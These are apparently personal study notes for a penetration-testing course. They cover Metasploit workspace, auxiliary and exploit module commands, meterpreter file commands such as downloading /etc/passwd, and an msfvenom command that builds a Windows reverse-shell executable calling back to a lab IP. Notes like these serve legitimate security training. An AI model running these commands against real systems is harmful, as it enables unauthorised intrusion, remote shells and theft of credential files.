# Metasploit Intro

## Rules:
- Allow in ALL machines
    ```
    multi/handler
    msfvenom (excluding meterpreter payload),
    pattern_create 
    pattern_offset 
    ```
- Allow in SINGLE machines
  ```
    meterpreter
    auxiliary
    post
    exploit
    scan
  ```

## Basics
- ``` workspace -a {new workspace name}``` add | delete ``` -d ```
- ``` db_nmap ``` Nmap inside Metasploit 
- ``` hosts ``` list of all discovered hosts up to this point
- ``` services -p {port}``` show all discovered services

## Auxiliary Module (輔助)
- ``` search type:auxiliary {module name} ``` search
- ``` use {module_id} ``` load certain module
- ``` info ``` show info
- ``` show options ``` 
- ``` unset RHOSTS ``` reset param
- ``` run ```
- ``` vulns```

## Exploit Module
- ``` search type:exploit {module name} ``` search
- ``` set payload payload/linux/x64/shell_reverse_tcp ```
- when success will have shell created -> move to background with ctrl z
- show sessions in background ``` sessions -l ``` 
- kill sessions ``` session -k {id} ``` | ``` session -K ``` kill all
- reset workspace wont kill sessions

# Payloads
## Staged vs Non-Staged
- ``` / ``` = Staged & ``` _ ``` Stagless for name
- Staged : 2 step to bypass AV (send smaller packet first, then smuggle the payload thru another step)
- Stageless : 1 step (large & one take) 

## meterpreter payload
- multiple cmd packaged for staged one & not directly have a Remote shell ( can do other stuff)
- ```  sysinfo ``` 
- ``` getuid ``` get UID lolll
- ``` shell ``` generate shell 
- ``` channel -l ``` show all active channel | ``` channel -i {id} ``` use certain channel
- ``` download /etc/passwd ``` = scp
- ``` lcat ``` = meterpreter version cat
- ``` upload /usr/bin/unix-privesc-check /tmp/ ``` = scp
- ``` ls {dir}``` = ls loll
- ``` search -f {fileName} ```
  
## Executable Payloads (exe,ps1,bin)
### msfvenom
- https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom 
- ``` msfvenom -l payloads --platform {windows/php/etc...} --arch x64 ``` show all payloads with criteria
- ``` msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe ``` example of generating payload

### metasploit handler in kali
- some payload req msf to connect & ncat cant handle
- ``` msf6> use multi/handler ```
- 